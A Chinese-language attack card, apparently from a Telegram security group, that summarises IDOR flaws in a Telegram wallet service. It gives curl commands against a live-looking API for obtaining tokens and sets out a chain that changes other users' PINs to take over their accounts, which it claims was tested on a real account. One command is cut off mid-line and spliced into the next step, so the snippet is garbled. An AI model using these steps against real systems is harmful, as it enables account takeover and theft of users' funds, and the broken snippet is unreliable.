# 福利来钱包完整数据包

- Source report: `fllqb_福利来钱包_完整数据.md`
- Full report: `domains/business-logic/case-reports/fllqb-wallet-dump/fllqb_福利来钱包_完整数据.md`
- Techniques: wallet, telegram, idor
- Fused: 2026-09-17

## Key findings (distilled)

- 余额/订单越权读：user/info、safe/user_info、order/query 按 token 识别，user_id 被忽略
- 提现越权：safe/withdrawal 按 token，无 user_id IDOR

## Repro snippets

```
# 1. 取 initData（需 Telegram 会话）
#    本地 opentele: RequestWebViewRequest(peer="fllqb", bot="fllqb", url="https://t.me/fllqb/wallet")
#    → 从返回 url 提取 tgWebAppData= 后的值

# 2. 生成设备 ID
curl -X POST "https://aliyun.xg805.com/api/gate/tgsdk/safe/device/gen"
# → {"code":20000,"data":"UT8P0094..."}

# 3. 登录拿 Token（注意：POST + JSON body）
curl -X POST "https://aliyun.xg805.com/api/gate/tgsdk/safe/login" \
  -H "Content-Type: application/json" \
  -d '{"init_data":"<initData>","bot_id":"5495837487","device_i
登录 → ad/query 市场 → 收集 tg_id/user_id → get_verify_info(tg_id) 越权 → TRON 地址+安全提示
change_pwd(user_id, old=123456, new=我的PIN) → 改掉对方 PIN → 账户归我控制
实测 hk098888：接管(123456→654321) → 验证(654321生效) → 回滚(→123456)
```

## When to reuse

- 同类标签命中：wallet, telegram, idor
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理
